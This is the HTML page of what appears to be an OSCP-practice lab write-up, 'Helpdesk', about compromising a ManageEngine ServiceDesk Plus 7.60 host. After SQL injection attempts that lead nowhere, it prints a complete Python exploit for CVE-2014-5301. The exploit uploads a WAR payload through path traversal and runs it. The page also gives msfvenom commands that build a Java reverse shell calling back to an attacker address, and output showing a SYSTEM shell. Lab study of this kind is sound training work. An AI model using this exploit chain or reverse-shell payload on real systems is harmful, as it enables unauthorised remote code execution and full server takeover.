@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Helpdesk :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Enumeration Web-proxy  Running Manage engine Service desk plus 7.60.  A quick search shows this is vulnerable to an SQL injection vulnerability.
+http://192.168.162.43:8080/WorkOrder.do?woMode=viewWO&amp;amp;woID=1%27union%20select%20null,null%20;-- This gives an SQL syntax error, telling us the webserver is running Apache Tomcat/5.0.28 with a MySQL database.
+SQL injection  There are no tables in the Database&amp;hellip;  http://192.168.162.43:8080/WorkOrder.do?woMode=viewWO&amp;amp;woID=1%20)%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,1%20from%20information_schmea.tables/*%20--  Since there were no tables in the database I went back to the drawing board as this was a dead end." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/oscp/helpdesk/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Helpdesk :: Research blog">
+<meta property="og:description" content="eZ CVE straight to `SYSTEM`" />
+<meta property="og:url" content="https://thomas-byrne.co.uk/oscp/helpdesk/" />
+<meta property="og:site_name" content="Helpdesk" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/oscp/helpdesk/">Helpdesk</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-10 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Helpdesk" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="web-proxy">Web-proxy<a href="#web-proxy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>Running Manage engine Service desk plus 7.60.</li>
+</ul>
+<p>A quick search shows this is vulnerable to an SQL injection vulnerability.</p>
+<pre tabindex="0"><code>http://192.168.162.43:8080/WorkOrder.do?woMode=viewWO&amp;woID=1%27union%20select%20null,null%20;--
+</code></pre><p>This gives an SQL syntax error, telling us the webserver is running <code>Apache Tomcat/5.0.28</code> with a MySQL database.</p>
+<h1 id="sql-injection">SQL injection<a href="#sql-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li>There are no tables in the Database&hellip;</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://192.168.162.43:8080/WorkOrder.do?woMode<span style="color:#f92672">=</span>viewWO&amp;woID<span style="color:#f92672">=</span>1%20<span style="color:#f92672">)</span>%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,1%20from%20information_schmea.tables/*%20--
+</code></pre></div><p><img src="/images/sqlerror.png" alt="sqlerror"></p>
+<blockquote>
+<p>Since there were no tables in the database I went back to the drawing board as this was a dead end.</p>
+</blockquote>
+<p>With some more enumeration I found the web server was vulnerable to an insecure File Upload vulnerability which can be exploited to gain code execution.</p>
+<h1 id="vulnerable-file-upload-cve-2014-5301">Vulnerable File upload (CVE-2014-5301)<a href="#vulnerable-file-upload-cve-2014-5301" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox" checked />
+    <label for="1">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-python" ><code>
+#!/usr/bin/python3
+
+# This script exploits the directory traversal vulnerability in
+# ManageEngine ServiceDesk Plus. It has been tested on version 7.6.0.
+# See also https://www.cvedetails.com/cve/CVE-2014-5301/
+
+# Use msfvenom to create a war file with meterpreter payload
+# msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f war &gt; shell.war
+#
+# or with a reverse TCP shell
+# msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f war &gt; shell.war
+
+# Before executing the script start the meterpreter handler
+# meterpreter
+#   use multi/handler
+#   set payload java/meterpreter/reverse_tcp
+#   set LHOST 192.168.56.108
+#   run
+#
+# or start netcat listener on LPORT
+# nc -nlvp 4444
+
+# Script usage: ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE
+# HOST: target host
+# PORT: target port
+# USERNAME: a valid username for ManageEngine ServiceDesk Plus
+# PASSWORD: the password for the user
+# WARFILE: a war file containing the mallicious payload
+
+from io import BytesIO
+from xml.etree import ElementTree
+
+import base64
+import os
+import random
+import requests
+import string
+import sys
+import time
+import zipfile
+
+# Generate a random string of given length
+def random_string(length):
+    charset = string.ascii_uppercase &#43; string.ascii_lowercase &#43; string.digits
+    return &#39;&#39;.join(random.choice(charset) for _ in range(length))
+
+# Extract name from web.xml in the given war file
+def get_war_app_base(war_file):
+    with zipfile.ZipFile(war_file, &#34;r&#34;) as war:
+        with war.open(&#34;WEB-INF/web.xml&#34;) as web_inf:
+            xml_root = ElementTree.fromstring(web_inf.read())
+            return xml_root.find(&#39;servlet&#39;).find(&#39;servlet-name&#39;).text
+
+# Check command line arguments
+if (len(sys.argv) - 1) != 5:
+    print(&#34;Usage: ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE&#34;)
+    exit(1)
+
+# Initialize
+host = sys.argv[1]
+port = sys.argv[2]
+username = sys.argv[3]
+password = sys.argv[4]
+war_file_name = sys.argv[5]
+
+me_base_url = &#34;http://&#34; &#43; host &#43; &#34;:&#34; &#43; port
+s = requests.session()
+
+# Get JSESSIONID which we have to pass during the authentication request
+url = me_base_url &#43; &#34;/&#34;
+s.get(url)
+
+# Authenticate the user with provided credentials
+url = me_base_url &#43; &#34;/j_security_check&#34;
+data = dict(j_username=username, j_password=password, logonDomainName=-1)
+s.post(url, data=data)
+
+# Upload bogous file - currently not needed
+# url = me_base_url &#43; &#34;/common/FileAttachment.jsp&#34;
+# multipart_data = [
+#     (&#34;module&#34;, (None, random_string(4))),
+#     (random_string(8), (random_string(8), random_string(32), &#34;application/octet-stream&#34;)),
+#     (&#34;att_desc&#34;, (None, &#34;&#34;))
+# ]
+# s.post(url, files=multipart_data)
+
+# Create ear file from the given war file
+display_name = random_string(32)
+ear_app_base = random_string(32)
+ear_file_name = ear_app_base &#43; &#34;.ear&#34;
+war_app_base = get_war_app_base(war_file_name)
+
+application_xml = &#34;&lt;?xml version=\&#34;1.0\&#34; encoding=\&#34;UTF-8\&#34;?&gt;&#34;
+application_xml &#43;= &#34;&lt;application&gt;&#34;
+application_xml &#43;= &#34;&lt;display-name&gt;&#34; &#43; display_name &#43; &#34;&lt;/display-name&gt;&#34;
+application_xml &#43;= &#34;&lt;module&gt;&lt;web&gt;&lt;web-uri&gt;&#34; &#43; war_file_name &#43; &#34;&lt;/web-uri&gt;&#34;
+application_xml &#43;= &#34;&lt;context-root&gt;/&#34; &#43; ear_app_base &#43; &#34;&lt;/context-root&gt;&lt;/web&gt;&lt;/module&gt;&#34;
+application_xml &#43;= &#34;&lt;/application&gt;&#34;
+
+war_file = open(war_file_name, &#34;rb&#34;)
+war_file_content = war_file.read()
+war_file.close()
+
+in_mem_ear = BytesIO()
+with zipfile.ZipFile(in_mem_ear, &#34;w&#34;, zipfile.ZIP_STORED) as ear_file:
+    ear_file.writestr(&#34;META-INF/application.xml&#34;, application_xml)
+    ear_file.write(war_file_name)
+
+# Upload ear file
+url = me_base_url &#43; &#34;/common/FileAttachment.jsp&#34;
+multipart_data = [
+    (&#34;module&#34;, (None, &#34;../../server/default/deploy&#34;)),
+    (random_string(4), (ear_file_name, in_mem_ear.getvalue(), &#34;application/octet-stream&#34;, {&#34;Content-Transfer-Encoding&#34;: &#34;binary&#34;})),
+    (&#34;att_desc&#34;, (None, &#34;&#34;))
+]
+req = requests.Request(&#34;POST&#34;, url, files=multipart_data)
+prepared_req = s.prepare_request(req)
+settings = s.merge_environment_settings(prepared_req.url, {}, None, None, None)
+r = s.send(prepared_req, **settings)
+
+# Execute uploaded payload
+for i in range(5):
+    url = me_base_url &#43; &#34;/&#34; &#43; ear_app_base &#43; &#34;/&#34; &#43;  war_app_base &#43; &#34;/&#34; &#43; random_string(16)
+    print(&#34;Trying &#34; &#43; url)
+    resp = s.get(url)
+    if (resp.status_code == 200):
+        exit(0)
+    else:
+        time.sleep(3)
+
+</code></pre>
+  </div>
+
+
+<h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Since this was an apache tomcat server we need a java executable in the .war file format.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/helpdesk<span style="color:#f92672">]</span>
+└─$ msfvenom -p java/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.49.193 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span> -f war &gt; shell.war
+</code></pre></div><p>Running the exploit with the default credentials we found earlier returns a shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/helpdesk<span style="color:#f92672">]</span>
+└─$ python3 cve.py 192.168.193.43 <span style="color:#ae81ff">8080</span> administrator administrator shell.war
+Trying http://192.168.193.43:8080/jRcIotUBRWbrSRcD69X4aWIpQzb4mIOJ/hyxdlizeaikxi/nGCt5Kng71mzWG1B
+Trying http://192.168.193.43:8080/jRcIotUBRWbrSRcD69X4aWIpQzb4mIOJ/hyxdlizeaikxi/jaaDwbAgP35gK3Ru
+
+</code></pre></div><p>Lol nice</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\M</span>anageEngine<span style="color:#ae81ff">\S</span>erviceDesk&gt;whoami
+nt authority<span style="color:#ae81ff">\s</span>ystem
+
+C:<span style="color:#ae81ff">\M</span>anageEngine<span style="color:#ae81ff">\S</span>erviceDesk&gt;
+</code></pre></div>
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
